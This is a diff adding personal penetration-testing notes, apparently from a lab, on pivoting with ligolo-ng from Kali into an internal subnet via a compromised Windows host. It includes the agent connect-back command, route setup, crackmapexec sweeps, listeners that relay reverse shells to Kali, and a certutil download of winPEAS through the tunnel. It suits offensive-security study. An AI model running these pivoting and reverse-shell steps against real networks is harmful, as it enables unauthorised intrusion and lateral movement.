@@ -1,1 +1,29 @@
+on Kali:
 
+ sudo ip tuntap add user kali mode tun ligolo
+  sudo ip link set ligolo up
+ ./ligolo_proxy_linux -selfcert
+
+On Windows:
+.\agent.exe -connect 192.168.45.158:11601 -ignore-cert
+session 1 , enter <----Join the session
+ifconfig <---- Get some information on the agent, two interfaces, you are interested in the internal network 172.16.107.254/24
+
+Back on kali 
+sudo  ip route add 172.16.107.0/24 dev ligolo <----Add the route to the internal network in kali
+ip route list <---Confirm you have a route to the internal network setup 
+
+Back on Windows:
+session 1, start <-----Be sure to start the tunnel, Now you should be able to access the internal network
+crackmapexec smb 172.16.107.0/24 <--- Just to check the pivot to the inernal network is working
+
+
+Listeners for reverse shells and file transfer
+listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 <---Any  connection that comes into ms01 on port 1234 will be redirected to your kali on port 4444, you  send the reverse shell to ms01 and its forwarded to kali
+
+File Transfer
+listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80  <----Port 80 is where  you run your python server,  
+certutil -urlcache -split -f http://ms01:1234/winPEASx64.exe  <----From your revshell download files from ms01 being relayed from you kali on port 80 
+
+venom's nmap scan through ligolo
+nmap -p- -sT -T5 -A
